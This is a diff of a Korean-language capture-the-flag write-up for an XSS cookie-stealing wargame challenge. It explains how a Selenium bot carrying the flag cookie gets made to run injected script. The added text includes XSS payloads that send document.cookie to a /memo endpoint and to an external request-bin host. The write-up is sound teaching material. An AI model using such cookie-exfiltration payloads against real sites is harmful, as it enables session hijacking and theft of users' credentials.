@@ -79,7 +79,7 @@ def flag():
 
 ### `POST`
 
-먼저, POST 요청의 본문에 포함된 `"param"`이라는 이름의 폼 데이터를을 가져온다.
+먼저, POST 요청의 본문에 포함된 `"param"`이라는 이름의 폼 데이터를을 가져온다. `/flag` 엔트리 포인트에서 `<form>` 태그로 입력을 받기 때문이다.
 
 그리고, `check_xss(param, {"name": "flag", "value": FLAG.strip()})` 함수는 `XSS` 공격을 탐지하기 위해 사용되는데, 
 
@@ -125,7 +125,7 @@ def check_xss(param, cookie={"name": "name", "value": "value"}):
 
 **뒤에서 더 설명하겠지만, `check_xss`는 `XSS` 공격이 발생할 때, `false`를 리턴해야하지만 `\vuln` 엔드 포인트에 `XSS` 취약점이 존재하기 때문에 제대로 검사가 되지 않아서 항상 `true`가 리턴된다.**
 
-`read_url` 함수는 쿠키를 세팅하고 `url`로 접속하는 함수라고 지금은 간단히 알고 넘어가자.
+`read_url` 함수는 쿠키를 세팅하고, **셀레니움을 통해 서버가** `url`로 접속하는 시뮬레이션을 해주는 함수라고 생각하자.
 
 # 취약점 분석
 
@@ -137,7 +137,7 @@ def check_xss(param, cookie={"name": "name", "value": "value"}):
 
 # Exploit
 
-위에서 분석한 `/vuln` 엔드 포인트의 취약점을 활용하여 이용자의 쿠키를 탈취해야 한다. 
+위에서 분석한 `/vuln` 엔드 포인트의 취약점을 활용하여 **임의 이용자의 쿠키**를 탈취해야 한다. (나의 쿠키가 아닌 **임의 사용자**의 쿠키이므로 임의 사용자가 접속하도록 해야한다.)
 
 탈취한 쿠키를 전달받기 위해서는 **외부에서 접근 가능한 웹 서버**를 사용하거나, 문제에서 제공하는 **`/memo` 엔드 포인트**를 사용할 수 있다.
 
@@ -145,7 +145,7 @@ def check_xss(param, cookie={"name": "name", "value": "value"}):
 
 ## 1. `/memo` 엔드 포인트를 사용하는 법
 
-현재 `index.html`의 코드에서 `/memo` 엔드 포인트에는 `hello`가 `memo`로 출력되고 있다.
+현재 `index.html`의 코드에서 `/memo` 엔드 포인트에는 `hello` 파라미터로 전달 되기 때문에 `hello`가 출력되고 있다.
 
 ```
 <p class="important"><a href="/vuln?param=<script>alert(1)</script>">vuln(xss) page</a></p>
@@ -155,25 +155,35 @@ def check_xss(param, cookie={"name": "name", "value": "value"}):
 
 <img width="997" alt="image" src="https://github.com/user-attachments/assets/51f07d84-65ea-4dda-8086-4479236d6c8e">
 
-근데 `/flag` 엔드 포인트에서 `<script>location.href = "/memo?memo =" + document.cookie</script>`를 입력해주면, 
+여기서, `/flag` 엔드 포인트에서 폼에 `<script>location.href = "/memo?memo =" + document.cookie</script>`를 입력해서 제출해주는 상황을 생각해보자. 
 
-`/vuln` 엔드 포인트에 먼저 접속하여 `return param`으로 `param`에 방금 대입해준 해당 스크립트 코드를 수행하게 되어서, `/memo` 엔드 포인터에서 플래그 값이 있는 `cookie`를 출력하게 된다.
+이렇게 되면, `/flag`의 기존 동작에 따라 폼으로 입력 받은 `param`을 통해 `/vuln` 엔드 포인트에 먼저 접속하여 `return param`을 수행하게 된다.
 
-<img width="978" alt="image" src="https://github.com/user-attachments/assets/18316fa7-5b75-404a-a2a8-4929683a8b0e">
+그럼 방금 `/flag`에서 `param`에 대입해준 스크립트 코드를 수행하게 되어서, 현재 URL이 `/memo` 엔드 포인트로 바뀌게 되고, 파라미터로 임의 이용자의 `cookie`가 전달되게 되어, 이를 통해 `memo.html` 파일이 출력되게 된다.
+
+```
+{% block content %}
+<pre>{{ memo }}</pre>
+{% endblock %}
+```
+
+**참고로, 여기서 임의 이용자는 코드를 수행한 자신이 아닌 서버의 봇이기 때문에 `FLAG = open("./flag.txt", "r").read()`로 플래그를 읽어서 쿠키에 세팅하게 된다. (`XSS`의 상황과, 자신의 쿠키에는 플래그 정보가 없다는 것을 잘 생각하자.)**
+
+`/vuln` 엔드 포인트에서 스크립트 코드가 실행되서 `location.href`가 `/memo`로 바뀌게 되면, 셀레니움에 의해 서버에서 `/memo`에 방문하는 시뮬레이션을 발생시켜, 플래그가 존재하는 쿠키가 `memo_text`에 추가되게 된다.
+
+플래그를 사용자도 볼 수 있고, `hello`가 게속 누적되는 이유는 `memo`의 텍스트가 계속 누적되는 이유는 `memo` 파라미터를 저장하는 `memo_text`가 전역 변수로 계속 더해지기 때문이다.
 
 <img width="976" alt="image" src="https://github.com/user-attachments/assets/eceb0fca-6060-4fd3-8965-8aee680d87ea">
 
-## 수정할 부분
+### 잘못했던 생각
 
-처음에 든 생각이, 그럼 바로 `/flag` 에서 `<script>document.cookie</script>` 를 해주면 인덱스 페이지를 통해 `/vuln`에 접근할 때, 바로 `document.cookie`가 출력되는게 아닌가라는 생각을 했는데,
+처음에 잘못했던 생각이, 바로 `/flag` 에서 `<script>document.cookie</script>` 를 해주면 인덱스 페이지를 통해 `/vuln`에 접근할 때, 바로 `document.cookie`가 출력되는게 아닌가라는 생각을 했는데,
 
-입력 후 다시 인덱스 페이지로 돌아가서 `/vuln`에 접근할 때는 `html` 페이지도 존재하지 않아서, `document.cookie`가 페이지에 출력되어 저장되있지 않아서, `<script>alert(1);</script>`만 수행되고 끝나기 때문에 `document.cookie`가 출력되지 않고,
+`read_url`을 통해서 `/vuln`에 접근하는 것은 폼을 입력한 현재 클라이언트가 아니라, `XSS` 공격에서 임의 이용자 역할을 하는 셀레니움이기 때문에 사용자에게는 아무 영향이 없다.
 
-`<script>location.href = "/vuln?param =" + document.cookie</script>`를 입력해주어도 
+따라서, 사용자가 인덱스 페이지에서 `/vuln`에 접근해서 할 수 있는 것은 `alert(1);`코드를 수행하는 것 뿐이며, `URL`을 통해 `http://host3.dreamhack.games:21913/vuln?param=<script>document.cookie<script>`로 접속해도, 이 쿠키는 세팅되지 않은 현재 클라이언트의 쿠키이기 때문에 아무 값도 출력되지 않는다.
 
-`URL`을 통해 `http://host3.dreamhack.games:21913/vuln?param=<script>document.cookie<script>`로 접속해도, 이 쿠키는 사용자의 쿠키가 아닌 서버의 쿠키에서 가져와야 하기 때문에 제대로된 플래그를 찾을 수 없다.
-
-따라서, `<script>location.href = "/memo?memo =" + document.cookie</script>` 코드를 수행해서 서버에 `/memo` 엔드 포인트에 리퀘스트를 보낸 후, `document
+따라서, 셀리니움을 통해서 서버 측에서 `/vuln`에 접근하여, 폼으로 전달한 스크립트 코드를 실행하게 하는 시뮬레이션을 발생시켜서 `/memo`로 후 `memo_text`에 플래그를 더해서 현재 클라이언트에게도 보이도록 해야한다.
 
 ## 웹 서버 사용
 
@@ -186,6 +196,12 @@ def check_xss(param, cookie={"name": "name", "value": "value"}):
 `/flag`에서 아래와 같은 코드를 입력하면, 아래 이미지와 같이 접속 기록에 포함된 플래그를 획득할 수 있다.
 
 `<script>location.href = "http://RANDOMHOST.request.dreamhack.games/?memo=" + document.cookie;</script>`
+
+이 스크립트를 입력해주면 셀레니움을 통해 서버가 해당 주소에 접속하여 `document.cookie` 값을 파라미터로 보내게 된다.
+
+**사실 이 때는 셀레니움을 통해 서버가 워게임 UR의 `/memo`에 접근하여 쿠키를 `memo_text`에 더해주는 것이 아니라, 서버의 `document.cookie`를 `Request Bin`으로 생성한 랜덤한 주소에 접속하여 파라미터로 전달하는 것이기 떄문에,**
+
+**`?memo =` 가 아니라 어떤 값으로도 써도 파라미터만 전달되면 상관없긴 하다. (`?asd =` 도 가능)**
 
 <img width="1039" alt="image" src="https://github.com/user-attachments/assets/2b9f9718-b288-47b4-adc7-623e83363e38">
 
